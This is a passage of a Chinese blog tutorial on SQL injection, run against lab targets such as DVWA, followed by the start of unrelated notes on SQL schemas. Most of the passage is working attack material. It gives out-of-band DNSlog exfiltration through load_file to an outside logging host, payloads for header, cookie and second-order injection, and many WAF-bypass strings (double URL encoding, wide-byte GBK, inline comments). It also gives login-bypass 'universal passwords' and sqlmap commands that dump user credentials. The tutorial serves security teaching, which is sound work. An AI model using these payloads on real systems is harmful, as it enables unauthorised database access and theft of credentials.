DNS在进行域名解析时会留下域名和解析ip的记录(DNSlog)，我们可以利用它显示我们的注入结果\n1.将想要窃取的数据（如数据库名、用户名等）作为这个域名的子域名拼接到查询中\n2.迫使数据库服务器向一个由我们控制的域名发起DNS查询请求\nDNSLOG注入需要有两个条件：\n目标数据库服务器能够向外网发起DNS请求 开启了load_file()读取文件的函数 准备DNSlog平台 网络上有很多公开DNSlog的服务，如www.dnslog.cn，或使用BurpSuite自带的BurpCollaborator\n以dnslog.cn为例，点击Get SubDomain后，我们会得到一个独一无二的子域名，例如：624elh.dnslog.cn： 构造注入Payload 我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是上文提到过的load_file()：\n1\u0026#39; and load_file(concat(\u0026#39;\\\\\\\\\u0026#39;,(select database()),\u0026#39;.624elh.dnslog.cn\\\\a\u0026#39;))# 当数据库执行这个Payload时，它会尝试使用load_file()去读取一个网络路径\nconcat()函数会将各部分拼接起来，构造出一个完整的UNC路径：\\\\dvwa.624elh.dnslog.cn\\a\n为了访问这个网络路径，服务器的操作系统必须先解析主机名 dvwa.624elh.dnslog.cn，因此它会向DNS服务器发起一个DNS查询请求\n回到DNSlog，点击Refresh Record，将会显示出dns解析记录\n这样，数据库名'dvwa'就作为子域名的一部分，被成功地带到了外部，实现了数据泄露：\n#7 http请求注入 GET/POST请求注入 完整看到这里的你，就会发现上面我们讨论的注入绝大多数都是在GET和POST的场景下\n我们简单句两个例子说明\n==GET请求（查询等）：==\n\u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id . \u0026#34;\u0026#39;\u0026#34;; $result = mysqli_query($conn, $sql); ?\u0026gt; 我们一般是在查询输入框中输入注入语句，其实也可以在url中：\nhttp://example.com/get_vuln.php?id=1\u0026#39; UNION SELECT 1, user, password FROM users# id后面其实就是我们之前在输入框中输入的内容\n==POST请求（登录等）：==\n\u0026lt;?php $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $sql = \u0026#34;SELECT * FROM users WHERE username = \u0026#39;\u0026#34; . $username . \u0026#34;\u0026#39; AND password = \u0026#39;\u0026#34; . $password . \u0026#34;\u0026#39;\u0026#34;; ?\u0026gt; 其实也就是在输入框里填写注入语句就行，也可以抓包后修改\nhttp头部参数注入 http头部有着许多参数，开发者可能因为记录日志、分析用户行为等目的，从这些参数中获取信息并存入数据库，但过程中没有进行过滤，导致了注入\n这里以最常见的User-Agent、Referer、X-Forwarded-For三个字段举例：\n\u0026lt;?php $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; // 获取伪造的客户端IP $user_agent = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; // 获取浏览器标识 $referer = $_SERVER[\u0026#39;HTTP_REFERER\u0026#39;]; // 获取来源页面 // 漏洞点一：根据IP查询该用户是否在黑名单中 $sql_ip = \u0026#34;SELECT * FROM ip_blacklist WHERE ip = \u0026#39;{$ip}\u0026#39;\u0026#34;; $result_ip = mysqli_query($conn, $sql_ip); // 漏洞点二：根据浏览器标识，提供定制化内容 $sql_ua = \u0026#34;SELECT * FROM custom_content WHERE user_agent_key = \u0026#39;{$user_agent}\u0026#39;\u0026#34;; $result_ua = mysqli_query($conn, $sql_ua); // 漏洞点三：记录访问来源 $sql_referer = \u0026#34;SELECT * FROM referer_stats WHERE page_url = \u0026#39;{$referer}\u0026#39;\u0026#34;; $result_referer = mysqli_query($conn, $sql_referer); echo \u0026#34;脚本执行完毕。\u0026#34;; ?\u0026gt; 这里三个字段都没有进行任何的过滤，我们抓包之后修改对应内容：\nGET /analytics.php HTTP/1.1 Host: vulnerable-site.com User-Agent: Mozilla/5.0\u0026#39; and (updatexml(1,concat(0x7e,(select database())),1)) and \u0026#39; X-Forwarded-For: 127.0.0.1\u0026#39; and (updatexml(1,concat(0x7e,(select database())),1)) and \u0026#39; Referer: http://google.com\u0026#39; and (updatexml(1,concat(0x7e,(select database())),1)) and \u0026#39; 方式和普通注入都是差不多的，核心思想没变，只是注意最好使用''闭合后半部分\ncookie注入 从原理上来说，cookie注入和其他的注入方式并没有什么不同，只是注入的地点不同\n我们既可以像上面的头部参数一样抓包修改cookie，也能在本地修改cookie达到注入目的\n以dvwa靶场high等级的sql盲注为例，我们先看看源码：\n\u0026lt;?php if( isset( $_COOKIE[ \u0026#39;id\u0026#39; ] ) ) { $id = $_COOKIE[ \u0026#39;id\u0026#39; ]; $getid = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = \u0026#39;$id\u0026#39; LIMIT 1;\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $getid ); $num = @mysqli_num_rows( $result ); if( $num \u0026gt; 0 ) { echo \u0026#39;\u0026lt;pre\u0026gt;User ID exists in the database.\u0026lt;/pre\u0026gt;\u0026#39;; } else { if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } header( $_SERVER[ \u0026#39;SERVER_PROTOCOL\u0026#39; ] . \u0026#39; 404 Not Found\u0026#39; ); echo \u0026#39;\u0026lt;pre\u0026gt;User ID is MISSING from the database.\u0026lt;/pre\u0026gt;\u0026#39;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]))) ? false : $___mysqli_res); } ?\u0026gt; dvwa提供了一个修改id的入口，而这个id就是这个页面的一个cookie\n在拿到我们输入的id值后，它没有经过任何过滤，直接插入了sql语句中，就像普通的sql注入点一样\n我们点击链接更换新cookie：\n1\u0026#39; and length(database())=4 # 刷新页面，页面显示User ID exists in the database.，说明查询成功了，也就是数据库名称长度为4\n值得注意的是，这段代码里还有这样的一段：\nif( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } 页面每次都会进行判断，如果随机数是3，就延迟2-4秒，完全干扰了时间盲注，迫使我们只能使用布尔盲注\n实战中对方可能并不会暴露cookie修改的界面，我们可以使用浏览器自带的开发者工具，或者浏览器扩展\nf12开发者工具（应用 -\u0026gt; cookie）：\n浏览器扩展（比如cookie editor）：\n#8 二次注入 二次注入比较特殊，它用于审查非常严格的情况下，不是窃取数据，而是篡改数据\n我们来看这样一个场景：有一个网站允许用户注册账号，之后可以在个人中心修改自己的密码\n用户注册的php：\n\u0026lt;?php $username = $_POST[\u0026#39;username\u0026#39;]; $username_escaped = addslashes($username); $sql = \u0026#34;INSERT INTO users (username, password) VALUES (\u0026#39;{$username_escaped}\u0026#39;, \u0026#39;some_password_hash\u0026#39;)\u0026#34;; mysqli_query($conn, $sql); ?\u0026gt; 开发者使用了addslashes对输入进行转义，过滤了可能的危险语句\n修改密码的php：\n\u0026lt;?php $current_user = $_SESSION[\u0026#39;username\u0026#39;]; $new_password = $_POST[\u0026#39;new_password\u0026#39;]; $sql = \u0026#34;UPDATE users SET password = \u0026#39;{$new_password}\u0026#39; WHERE username = \u0026#39;{$current_user}\u0026#39;\u0026#34;; ?\u0026gt; 开发者觉得从数据库里面取出的数据绝对正确，于是没有对它做任何处理\n现在我们注册一个账号，用户名叫：admin'#，假设这个网站管理员账号叫admin，跟我们输入的名称很像吧\n经过注册程序的检查，这个名称没有任何问题，于是放进了数据库\n接下来，我们修改这个账号的密码为123，数据库自信地取出这个账号名称放在sql语句里\n这时，sql语句就变成了：\nUPDATE users SET password = \u0026#39;new_password\u0026#39; WHERE username = \u0026#39;admin\u0026#39;#\u0026#39; 因为#的注释，我们竟然直接修改了admin账号的密码！\n好啦，这下我们可以随意登录管理员的账号啦~\n绕过WAF 为了防止sql注入，许多程序应用都会设置各种各样的过滤防护条件——Web应用防火墙(WAF)\n作为攻击者的我们，就需要想办法绕过这些条件，达到注入的目的\n#1 空格过滤绕过 众所周知，sql语句里面存在着大量的空格，而有些WAF会直接把空格加入黑名单，比如下面的代码：\n$id_sanitized = str_replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;, $_GET[\u0026#39;id\u0026#39;]); $sql = \u0026#34;SELECT user, password FROM users WHERE user_id = \u0026#34; . $id_sanitized; 它会直接把用户输入内容中的空格移除，然后再拼接进去\n但是，空格有很多的绕过方式\n注释绕过 在大多数的数据库（特别是mysql）中，注释/**/能够代替空格：\n1\u0026#39;/**/union/**/select/**/1,database()# 可以看到，sql语句能够正常运行\nurl编码绕过 一般来说，我们会使用+代替空格，因为+是空格的一种url标准编码形式，如果不行，就要另寻他法了\n对于大多数数据库来说，它们在解析SQL语句时，会将多种空白字符都视为空格一样的分隔符，包括：\n符号 说明 %20 普通空格 %09 TAB 键(水平) %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB 键(垂直) %a0 空格（和普通空格不一样） 虽然过滤了普通空格，但是其他的符号仍然可以起到空格相等的作用\n制表符等都是不可见字符，我们需要使用url编码来表示他们，比如：\n1\u0026#39;%0dunion%0dselect%0d1,database()# 括号绕过 数字型 mysql数据库有这样一个特性：\n在where id=1后加上=1，变成where id=1=1，意思是查询结果不变\n在where id=1后加上=0，变成where id=1=0，意思是查询结果取反\n结合substring()，我们就能构造出下面的不带有空格注入：\n1=(ascii(substring(database(),1,1))=100) 如果数据库名称第一个字符不是d，那么就会是1=0，和正常的输入1的结果是完全不同的\n这个思想和盲注异曲同工，但是你可能也发现了，上面的payload只适用于数字型的注入\n字符型\u0026amp;数字型 mysql数据库还有一个特性：\n任何可以计算出结果的语句，都可以用括号包围起来 如果我们想要在字符型进行空格的括号绕过，可以使用()把and后面的表达式包裹起来（前提是有返回值）\n上文提到的sleep()函数其实是有返回值的，执行成功为1，失败为0，因此可以使用()包裹：\n1\u0026#39;and(sleep((ascii(substring(database(),1,1))=100)+4))# 而if()函数的返回值则取决于我们写在if里面的函数：\n1\u0026#39;and(if(length(database())=4,sleep(5),1))# 效果和时间盲注相同，这种方式可以用在字符型，也可以用在数字型\n如果逗号被过滤，一般也要使用括号绕过：逗号绕过——绕过函数参数中的逗号 #2 内联注释绕过 绕过特定屏蔽词 为了保持和其他数据库的兼容，mysql数据库会执行放在/*!...*/里面的语句\n这样，如果WAF限制了不能使用一些查询语句，我们就可以把它放在/*!...*/里，比如：\n1\u0026#39; union/*!select*/ 1,2 # WAF会把它看成\u0026quot;带有奇怪符号的注释\u0026quot;而放行，但是到了mysql环境里，就能被执行：\n我们还可以在/*!...*/里面加上版本号：/*!50001...*/，表示数据库是5.00.01及以上版本，该语句才会被执行\n我使用的dvwa的mysql版本是5.5.53，如果使用1' union/*!60001select*/ 1,2 #，就会报版本错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;1,2 #\u0026#39;\u0026#39; at line 1 干扰WAF过滤 有的WAF过滤覆盖的范围可能不够大，比如会过滤掉order by，但是如果在中间加上/*!10440*/：\n1\u0026#39; or 1=1 order/*!10440*/by 1# 这样很可能就能让WAF识别错误，如果一个内联注释不行，就多来几个：\n1\u0026#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1# 或者干脆使用普通的注释干扰：\n1\u0026#39; or 1=1 order/*%%!asd%%%%*/by 1# #3 大小写绕过 有的WAF只针对小写的（或者大写的）查询语句做了过滤：\n$id = $_GET[\u0026#39;id\u0026#39;]; if (strpos($id, \u0026#39;union\u0026#39;) !\u0026lt;mark\u0026gt; false || strpos($id, \u0026#39;select\u0026#39;) !\u0026lt;/mark\u0026gt; false) { die(\u0026#39;error\u0026#39;); } $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id . \u0026#34;\u0026#39;\u0026#34;; 然而很多sql数据库是不区分大小写的，我们就可以大小写交错写来绕过：\n1\u0026#39; uNiOn sElEcT 1,database()# #4 双写绕过 部分WAF所做的工作只是简单的把不允许出现的查询内容（比如sql语句）替换成空字符串：\n$id_sanitized = str_replace(array(\u0026#39;union\u0026#39;, \u0026#39;select\u0026#39;), \u0026#39;\u0026#39;, $_GET[\u0026#39;id\u0026#39;]; ); $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id_sanitized . \u0026#34;\u0026#39;\u0026#34;; 这种过滤方式是很不可靠的，因为就算有危险内容，简陋过滤之后剩下的部分仍然会进入查询（一次过滤）\n我们就可以通过\u0026quot;双写\u0026quot;，比如selselectect，替换中间的select为空后，剩下的部分仍然是select：\n1\u0026#39; uniunionon selselectect 1,2# 过滤器替换后：\n1\u0026#39; union select 1,2# #5 编码绕过 如果WAF针对关键词进行了区分大小写的过滤，这时候就不能通过大小写和双写蒙混过关了\n不过根据WAF一次过滤的特点，我们还是利用各种编码构造出payload\n双重URL编码绕过 因为上传的payload只会url解析一次，我们把部分字符再次进行url编码：\n1\u0026#39; union se%256cect 1,database()# WAF部分(%25 -\u0026gt; %)看见的内容是：\n1\u0026#39; union se%6cect 1,database()# 执行部分(%6c -\u0026gt; l)看见的是：\n1\u0026#39; union select 1,database()# 这就成功传入了目标语句\n附上一张url编码表：\n十六进制、Unicode编码、ASCII编码绕过 其实就是把过滤的字符转换成不同的编码欺骗WAF，比如十六进制：\n1%ef%bc%87 or 1=1# 部分WAF无法解析%ef%bc%87，放行之后会在执行sql语句的服务器(比如IIS)解析，是全角字符＇：\n1＇ OR 1=1 当然你也能直接输入全角试试能不能绕过，这里只是举一个例子\n其他方式大同小异，这里不多赘述\n#6 等价代替绕过 WAF限制了某一些的符号、语句或者函数，但我们可以设法找到功能一样或相似的来代替\n逻辑符号过滤 等号(=)过滤绕过 在SQL语句里，除了=，还有很多用于比较的运算符：\nlike：用于匹配字符串，A like B表示B是A in：用于查找目标是否在对应组中 rlike：只要匹配字符串出现即可，A rlike B表示B在A里面 regexp：和rlike用法一样 between：expr between 下界 and 上界，表示是否expr \u0026gt;= 下界 \u0026amp;\u0026amp; exp \u0026lt;= 上界，上下界可以相等 如果WAF过滤了=，我们可以使用他们实现相同目的：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = \u0026#39;users\u0026#39;# 使用like匹配：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like \u0026#39;users\u0026#39;# 使用in匹配（注意in匹配的对象要是一个组）：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (\u0026#39;users\u0026#39;)# 使用rlike/regexp匹配：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike \u0026#39;users\u0026#39;# 使用between判断：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between \u0026#39;users\u0026#39; and \u0026#39;users\u0026#39;# 大于号(\u0026gt;)和小于号(\u0026lt;)过滤绕过 使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找\n如果无法使用比较操作符，那么就需要使用到greatest()和least()来进行绕过了\ngreatest(n1,n2,n3,\u0026hellip;)函数返回输入参数(n1,n2,n3,\u0026hellip;)的最大值，least()则是返回最小值：\n1\u0026#39; and greatest(ascii(substr(database(),0,1)),64)=64 等价于：\n1\u0026#39; and ascii(substr(database(),0,1))\u0026gt;64 and和or过滤绕过 符号 等价符号 and \u0026amp;\u0026amp; or || xor | not ! 注释符号过滤 如果WAF过滤了#和-- ，我们可以使用另一个'闭合后面的'：\n1\u0026#39; union select 1,2 or \u0026#39;1 或者\n1\u0026#39; union select 1,\u0026#39;2 逗号过滤 绕过limit中的逗号 在进行盲注时，我们经常需要逐行读取数据，会用到limit m, n\n可以使用limit m offset n代替，表示取m行，跳过n行：\n1\u0026#39; union select 1,database() limit 1 offset 0 # 等价于\n1\u0026#39; union select 1,database() limit 0,1 # 绕过函数参数中的逗号 很多函数需要多个参数，用逗号隔开，例如substring(string, m, n)\n可以使用substring(stringfrom m for n)代替：\n1\u0026#39; and substring(database()from 1 for 1)=\u0026#39;d\u0026#39; # 如果空格被过滤了，可以使用()包裹from和for后面的数字：\n1\u0026#39; and substring(database()from(1)for(1))=\u0026#39;d\u0026#39; # 绕过select列表中的逗号 union联合查询注入时，我们经常需要一次性查询多个列，如union select user, password\n可以使用join语句代替：\n1\u0026#39; union select * from (select database())a join (select version())b# 这段语句是如何工作的？我们逐一拆解：\n(select database())a: 创建了一个只含一列（数据库名）的临时表，并别名为 a\n(select version())b: 创建了另一个只含一列（版本信息）的临时表，并别名为 b\n... a join b: 通过join将这两个只有一行一列的表连接起来，形成一个一行两列的新表\nselect * from...: 最后用 select * 将这个新表的所有列（即我们想要的数据库名和版本信息）查询出来\n当然，select后面的内容可以改成你想要的内容，select的数量也根据字段数确定，多join几次就行\n函数过滤 常见函数过滤 下面是一些常见的等价函数：\n常用函数 等价函数或语法 功能 substring(str, m, n) substr(str, m, n)\nmid(str, m, n)\nreverse+left 截取字符串 ascii(char) ord(char) 返回字符的ASCII码 if(exp1, exp2, exp3) case when exp1 then exp2 else exp3 end 条件判断语句 database() schema() 返回当前数据库名 user() current_user()\nsession_user()\nsystem_user()\n@@user 返回当前数据库用户 version() @@version 返回数据库版本信息 concat(s1, s2, ...) concat_ws(sep, s1, s2, ...)\ngroup_concat(name) 拼接字符串 hex(str) 0x... (十六进制字面量) 将字符串转换为十六进制 sleep(seconds) benchmark(count, exp) 造成时间延迟 datadir() @@datadir 返回数据库路径 大部分相信都很熟悉了，这里介绍个几个比较不常见的：\ncase when语句代替if 用法一： case when exp1 then exp2 else exp3 end\n如果exp1为真就返回exp2，反之返回exp3\n1\u0026#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)# 用法二： case x when y then exp2 else exp3 end\n如果x=y则返回exp2，反之返回exp3\n1\u0026#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)# reverse+left代替substring left函数不能截取某一个精确的字符，但是结合reverse和ascii函数可以做到substring+ascii一样的效果：\nascii(reverse(left(string, n))) 这个组合可以做到取出string字符串第n位的ascii码\n怎么工作的呢？我们以ascii(reverse(left('ABCDE', 3)))为例：\nleft('ABCDE', 3)\n首先，left()函数从左边截取前3个字符，得到结果 'ABC'\nreverse('ABC')\n接着，reverse()函数将上一步的结果'ABC'进行反转，得到'CBA'\nascii('CBA')\n这是最关键的一步，ascii()函数会返回其参数字符串的第一个字符的ASCII码\n在这里，字符串'CBA'的第一个字符是'C'，其ASCII码是67\ntrim代替substring trim()函数在SQL中主要用于移除字符串首尾的字符\ntrim(both|leading|trailing remstr from str) str: 要处理的源字符串\nremstr: 要从str中移除的子字符串\nboth|leading|trailing: 指定移除的位置\nleading: 只从开头移除\ntrailing: 只从结尾移除\nboth: 从开头和结尾两端移除（默认）\n但如果我们让它移除一个不存在的字符，他什么都不会做：\ntrim(leading \u0026#39;e\u0026#39; from \u0026#39;abcd\u0026#39;) 返回的结果仍然是abcd，因为abcd的开头不是e\n利用这一点，我们就可以不直接比较字符是否相等，而是通过比较两次trim()操作的结果是否相同，来推断一个字符是否是目标字符串的开头\n第一次trim()：\n(trim(leading \u0026#39;a\u0026#39; from database()) = (trim(leading \u0026#39;b\u0026#39; from database())) 前者返回 'dvwa' （开头不是\u0026rsquo;a\u0026rsquo;）,后者返回 'dvwa' （开头也不是\u0026rsquo;b\u0026rsquo;）最终 'dvwa' = 'dvwa'，表达式为真\n这样的话，我们就能判断数据库名称不是以a或者b开头，跳过这两个字母，继续往下尝试\n第二次trim()：\n(trim(leading \u0026#39;c\u0026#39; from database()) = (trim(leading \u0026#39;d\u0026#39; from database())) 前者返回 'dvwa' （开头不是\u0026rsquo;c\u0026rsquo;）,后者返回 'vwa' （开头是\u0026rsquo;d\u0026rsquo;）最终 'dvwa' = 'vwa'，表达式为假\n我们就能够判断，数据库名称是以c和d其中的一个字母开头，取其中一个字母，继续往下尝试\n第三次trim()：\n(trim(leading \u0026#39;d\u0026#39; from database()) = (trim(leading \u0026#39;e\u0026#39; from database())) 表达式为'vwa' = 'dvwa'，表达式为假，我们就可以确定，数据库名称是以d和e其中的一个字母开头\n再结合上一次的判断结果，c和d中有一个是开头字母，就能确定是以d开头了\n如果这个表达式为假，说明d和e都不是，而c和d中有一个是，我们同样能以此确定是以c开头\n这样一位一位判断，就能凑出全貌\n#7 宽字节绕过 注入原理 宽字节注入是一种专门针对Web应用程序与数据库之间字符集编码不一致而产生的SQL注入漏洞\n其核心原理是PHP转义函数的单字节和MySQL数据库（当使用GBK等宽字节编码时）的多字节之间的矛盾\nWeb应用层（如PHP）：WAF在工作时，并不关心字符的实际编码 。它只是简单地将它认为是危险的单字节字符（如单引号'，其十六进制为0x27），并前面加上一个反斜杠\\进行转义（十六进制为0x5c），让这个危险的字符失去原本的功能，被当成普通的字符进行查询\n数据库层（如MySQL）：当数据库连接的字符集被设置为GBK这类宽字节编码时，它会尝试将两个连续的字节解析为一个汉字或其他宽字符\n在GBK编码中，一个宽字节的第一个字节的范围是0x81-0xFE 。当MySQL遇到这个范围内的字节时，它会认为这是一个宽字符的开始，并把紧随其后的下一个字节也一并“吃掉”，作为该字符的第二部分\n攻击者正是利用了MySQL的这个特性，构造一个第一个字节在0x81-0xFE范围内、而第二个字节恰好是0x5c（即反斜杠\\）的字符，让MySQL把PHP辛苦加上去的反斜杠当作普通字符“吃掉”，从而使单引号'重新变有效，导致注入成功\n注入过程 mysql_query(\u0026#34;SET NAMES gbk\u0026#34;); $id=check_addslashes($_GET[\u0026#39;id\u0026#39;]); $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; 这段代码的关键点在于，它使用SET NAMES gbk将数据库连接设置为GBK编码，同时又使用了自定义的check_addslashes函数对输入进行转义\n普通注入(1\u0026rsquo;#)：\n攻击者提交?id=1'#，check_addslashes函数将'转义为\\' ，mysql最后执行的语句是：\nSELECT * FROM users WHERE id=\u0026#39;1\\\u0026#39;#\u0026#39; 这里的转义后的'变成了普通的符号，无法闭合字符串\n宽字节注入(1%df\u0026rsquo;#)：\n攻击者提交?id=1%df'#，check_addslashes函数将'转义为\\'，在url编码下变成：\n?id=1%df%5c%27# %5c就是被添加进去的反斜杠\\\n请求到达MySQL服务器，由于连接是GBK编码，MySQL开始按照GBK规则解析字节流0xdf 0x5c 0x27：\nMySQL首先读到0xdf，因为它在0x81-0xFE范围内，MySQL认为这是一个宽字符的开始\n随后，MySQL“吃掉”了紧随其后的0x5c（反斜杠\\）作为这个宽字符的第二字节\n0xdf5c被组合成了一个宽字符（在GBK中为“運”），此时，用于转义的反斜杠\\已经被消耗掉了\nMySQL继续向后解析，遇到了0x27（单引号'）这个单引号前面已经没有了反斜杠，它变成了一个有效的SQL语法符号\n最终，MySQL实际执行的语句变成了：\nSELECT * FROM users WHERE id=\u0026#39;1運\u0026#39;\u0026#39; # #8 正则表达式绕过 众所周知，正则表达式里有很多的修正符，只有设置适当，才能过滤到目标的字符串\n有些粗心的WAF没有设置好修正符，这就让我们有机可乘：\n$id = $_GET[\u0026#39;id\u0026#39;]; $pattern = \u0026#39;/select.*from/i\u0026#39;; if (preg_match($pattern, $id)) { die(\u0026#39;检测到攻击，脚本终止！(Attack Detected!)\u0026#39;); } $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id . \u0026#34;\u0026#39;\u0026#34;; 在这里的过滤中，WAF使用了i修正符匹配正则select.*from，意味着大小写绕过无效\n然而，他忘记了使用s修正符！\n元字符.可以匹配除换行符以外的任意单个字符，没有使用s修正符，所以 . 无法匹配换行符！\n而对于MySQL来说，换行符和空格、制表符一样，都是合法的空白分隔符\n所以，我们可以在查询语句里面插入换行符绕过：\n1\u0026#39; union select 1,table_name%0afrom information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; # ↑ #9 多参数请求绕过（双输入表单） 绕过间隔代码 部分表单（比如登录界面）是通过拼凑用户输入的内容来进行查询的，比如：\n$param_a = $_GET[\u0026#39;a\u0026#39;]; $param_b = $_GET[\u0026#39;b\u0026#39;]; $sql = \u0026#34;SELECT * FROM user WHERE name = \u0026#39;\u0026#34; . $param_a . \u0026#34;\u0026#39; AND password = \u0026#39;\u0026#34; . $param_b . \u0026#34;\u0026#39;\u0026#34;; WAF可能对单个的内容做了过滤，这时候我们就可以把注入语句拆分\na部分输入：\n1\u0026#39; union/* b部分输入：\n*/select 1,2# 这样拼凑之后的sql语句就是：\nSELECT * FROM user WHERE name = \u0026#39;1\u0026#39; union/*\u0026#39; AND password = \u0026#39;*/select 1,2#\u0026#39; ~~~~~~~~~~~~~~~~~~~~~~~~~ 我们就把中间b的部分注释掉了，并且绕过了WAF，成功注入了查询语句\n万能密码 还可以构造出万能密码\n我们使用管理员的账号登录，假设是admin，密码输入：\n\u0026#39;or 1=1# 这样sql语句就变成了：\nSELECT * FROM user WHERE name = \u0026#39;admin \u0026#39; AND password = \u0026#39;\u0026#39;or 1=1# \u0026#39; 我们竟然直接登录了管理员的账号，这是为什么呢？\n一般没有进行SQL语句参数化的登录语句是这样的：\nSELECT * FROM user WHERE name = \u0026#39;xxx\u0026#39; AND password = \u0026#39;xxx\u0026#39; 数据库管理系统DBMS会判断返回的行数，如果有返回行，证明账号和密码是正确的，即登录成功\n而在我们输入万能密码后，sql语句变成了：\nSelect * From 用户表 Where UserName=xxx and Password=\u0026#39;\u0026#39; or 1=1#\u0026#39;\u0026#39; or是或者的意思，也就是Password=xxx的时候可以登录，也可以是1=1的时候可以登录\n但1永远等于1，所以登录条件永远成立！\n或者换一种方式，我们直接在账号处就使用：\nadmin\u0026#39;# 密码随便填写，这样sql语句就是：\nSELECT * FROM user WHERE name = \u0026#39;admin\u0026#39;# \u0026#39; AND password = \u0026#39;xxx\u0026#39; 完全忽略了密码的校验，也就顺利登录了管理员账号\n恭喜，你现在已经学会了手工注入！\n呃，可是这也太麻烦了吧，又要判断这个又要试那个的，难道没有更简单的方法吗?\n当然是有的！那就是使用自动化注入工具\u0026ndash;SqlMap！\nSqlMap使用 下载地址：\ngit clone https://github.com/sqlmapproject/sqlmap.git 基本使用步骤 检查注入点 -u：指定目标url\n\u0026ndash;batch：全自动模式，问什么都答对(y)`\nsqlmap -u http://192.168.204.133/show.php?id=33 --batch sqlmap指出它通过四种不同的方式成功注入了目标：\nboolean-based blind (布尔盲注) error-based (报错注入) time-based blind (时间盲注) UNION query (联合查询注入) 而由布尔盲注的payload:id=33 AND 3115=3115可以看出是数字型注入（id=33周围无单引号）\n由联合查询注入的target URL appears to have 15 columns in query可以知道一共有十五个字段\n爆破数据库信息 -dbs：爆破所有的数据库名称\nsqlmap -u http://192.168.204.133/show.php?id=33 --dbs --batch \u0026ndash;current-db：爆破当前数据库名称\nsqlmap -u http://192.168.204.133/show.php?id=33 --current-db --batch 结果说明现在的表名为cms\n爆破指定数据库的所有表名 -D：指定数据库名\n\u0026ndash;tables：枚举所有表\nsqlmap -u http://192.168.204.133/show.php?id=33 -D cms --tables --batch 爆破指定表的所有列名 -T：指定表名\n\u0026ndash;colums：枚举所有列\n注意此处要先指定数据库名，再指定表名：\nsqlmap -u http://192.168.204.133/show.php?id=33 -D cms -T cms_users --columns --batch #### extractvalue (XML_document, XPath_string)\n第一个参数：XML_document 是目标XML文档 第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容 select user,password from users where user_id=1 and (extractvalue(1,0x7e)); 由于0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误\nupdatexml (XML_document, XPath_string, new_value) 打印指定列名的字段数据 -C：指定列名\n\u0026ndash;dump：取出指定列名的所有数据\nsqlmap -u http://192.168.204.133/show.php?id=33 -D cms -T cms_users -C username,password --dump --batch 查看用户权限 \u0026ndash;users：列出数据库管理系统用户\nsqlmap -u http://192.168.204.133/show.php?id=33 --users --batch \u0026ndash;current-user：查看当前连接数据库用户\nsqlmap -u http://192.168.204.133/show.php?id=33 --current-user --batch \u0026ndash;is-dba：判断当前用户是否是DBA（数据库管理员）\nsqlmap -u http://192.168.204.133/show.php?id=33 --is-dba --batch 如果是数据库管理员，就代表有写的权限，可以在服务器上面写入一句话木马\n查看数据库密码 \u0026ndash;password：自动寻找有没有常见的用户名和密码列\n可以看成是一系列操作（找到password表和dump）的自动化：\nsqlmap -u http://192.168.204.133/show.php?id=33 -passwords 结合burpsuite使用 有的时候我们需要对一个表单进行注入，这时候就可以使用post注入\n-r：从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）\n拦截请求 在设置代理后，表单随便填一个内容提交，查看post请求内容，复制另存为.txt 进行爆破 sqlmap -r post.txt --dbs --batch 同样可以得到正确结果\n详细的sqlmap学习请参考这位师傅的文章，非常完整，无与伦比的好：\nTr0y\u0026rsquo;s Blog\u0026ndash;SQLmap 使用手册 ","date":"2025-07-02T00:52:02+08:00","image":"http://picture.928330.xyz/typora/bbe3473c5e7044490ec526dc455a0a8c.jpeg","permalink":"https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/","title":"SQL注入：从入门到入土"},{"content":"模式 定义模式 CREATE SCHEMA 模式名 AUTHORIZATION 用户名\neg:为用户ZHANG定义一个S-T模式：\nCREATE SCHEMA \u0026#34;S-T\u0026#34; AUTHORIZATION ZHANG eg:为用户ZHANG定义一个未命名的模式：\nCREATE SCHEMA AUTHORIZATION ZHANG 未定义模式名称的时候，默认模式为用户名\n删除模式 DROP SCHEAM 模式名\n普通：用于删除空的模式，如果模式下面有对象（表、视图）等，拒绝删除\nDROP SCHEAM 模式名 CASCADE\n级联：把模式里面的对象一并删除\nDROP SCHEAM 模式名 RESTRICT\n限制：会把对象转移到公共模式保留并删除模式，但如果对象和模式有联系，则拒绝删除模式\n基本表 定义基本元素 数据类型 数据类型 表示内容 